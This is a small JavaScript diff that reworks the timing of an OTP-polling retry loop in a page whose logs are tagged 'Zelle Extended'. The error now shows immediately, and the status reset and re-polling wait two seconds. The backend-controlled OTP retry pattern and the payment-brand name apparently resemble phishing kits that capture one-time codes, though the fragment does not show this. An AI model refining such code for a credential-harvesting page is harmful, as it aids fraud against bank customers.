@@ -763,18 +763,19 @@
                     pollingStopped = true;
                     clearInterval(otpPollInterval);
                     
-                    // Show error and reset status for retry
+                    // Show error immediately
                     showOtpError();
                     
-                    // Reset status to 'idle' so user can try again
-                    await fetch(`${API_URL}/api/reset-otp-status?id=${userId}`, {
-                        method: 'POST'
-                    });
-                    
-                    // Restart polling for new attempt after 3 seconds
-                    setTimeout(() => {
+                    // Wait 2 seconds before resetting status and restarting polling
+                    setTimeout(async () => {
+                        // Reset status to 'idle' so user can try again
+                        await fetch(`${API_URL}/api/reset-otp-status?id=${userId}`, {
+                            method: 'POST'
+                        });
+                        
+                        // Restart polling for new attempt
                         startOtpPolling(userId);
-                    }, 3000);
+                    }, 2000);
                 }
             } catch (error) {
                 console.error('[Zelle Extended] ❌ Polling error:', error);
